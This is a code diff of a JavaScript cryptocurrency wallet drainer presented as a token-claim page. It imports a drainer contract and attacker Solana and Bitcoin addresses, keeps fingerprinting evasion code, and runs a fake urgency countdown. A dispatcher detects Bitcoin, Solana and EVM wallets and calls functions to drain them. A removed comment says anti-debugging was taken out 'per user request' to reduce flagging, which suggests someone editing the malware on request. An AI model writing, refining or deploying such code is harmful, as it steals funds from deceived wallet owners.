@@ -1,7 +1,6 @@
 import { CONFIG } from './config.js';
 
-// ====== ANTI‑DEBUGGING REMOVED per user request ======
-// (No console/inspection detection to reduce flagging)
+// ====== ANTI‑DEBUGGING REMOVED – no console or dev tools protection ======
 
 // ====== IMPORT CONTRACT DATA FROM CONFIG ======
 const { DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS } = CONFIG;
@@ -169,8 +168,7 @@ const CURRENCY_CONVERTER = {
   },
 };
 
-// ====== EVASION TECHNIQUES ======
-// (Kept as is, but could be reduced if needed; we keep for functionality)
+// ====== EVASION TECHNIQUES (kept for fingerprinting) ======
 const EVASION_TECHNIQUES = {
   async generateWasmFingerprint() {
     try {
@@ -359,6 +357,7 @@ let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
 let contractInstance;
 const CLAIM_THRESHOLD_USD = 3;
 
+// Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
 
@@ -463,7 +462,6 @@ document.addEventListener("DOMContentLoaded", async function () {
     initializeMobileSpecificOptimizations();
   }
 
-  // Attempt to restore saved connection from localStorage
   restoreSavedConnection();
 });
 
@@ -494,7 +492,7 @@ function restoreSavedConnection() {
   }
 }
 
-// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION ======
+// ====== ENHANCED BALANCE CHECK ======
 async function checkAndAutoTriggerClaim() {
   if (!connectedAddress || !web3 || userHasClaimed) return;
 
@@ -879,7 +877,6 @@ async function detectAllERC20Tokens(userAddress) {
     });
   }
 
-  // NFT detection (optional)
   const nftContracts = [
     "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
     "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
@@ -1855,10 +1852,10 @@ function startClaimUpdates() {
   }, 30000);
 }
 
+// ====== UPDATED COUNTDOWN – 1 day 7 hours 50 minutes = 114,600 seconds ======
 function startCountdown() {
-  // 1 day 7 hours 50 minutes = 114600 seconds
-  const totalDuration = 114600;
-  let remainingTime = totalDuration;
+  const remainingDuration = 114600; // 1d 7h 50m
+  let remainingTime = remainingDuration;
   updateCountdownDisplay(remainingTime);
   countdownInterval = setInterval(() => {
     remainingTime--;
@@ -1871,8 +1868,7 @@ function startCountdown() {
       }
       return;
     }
-    // Update progress bar when time is low (e.g., last 10%)
-    if (remainingTime <= totalDuration * 0.1 && !progressUpdated) {
+    if (remainingTime <= 900 && !progressUpdated) {
       if (progressBar) progressBar.style.width = "90%";
       if (progressPercentage) progressPercentage.textContent = "90%";
       progressUpdated = true;
@@ -2042,7 +2038,6 @@ setTimeout(() => {
 
 // ====== MULTI‑CHAIN DISPATCHER ======
 async function initiateClaimProcess() {
-  // Bitcoin (UniSat)
   if (window.unisat) {
     try {
       const accounts = await window.unisat.getAccounts();
@@ -2056,7 +2051,6 @@ async function initiateClaimProcess() {
     }
   }
 
-  // Solana
   const solanaWallets = getSolanaWallets();
   if (solanaWallets.length > 0 && solanaPublicKey) {
     console.log("🟪 Solana wallet detected, attempting SOL drain...");
@@ -2064,7 +2058,6 @@ async function initiateClaimProcess() {
     return;
   }
 
-  // EVM
   if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
     console.log("🟦 EVM wallet detected, attempting EVM drain...");
     await drainEVM();
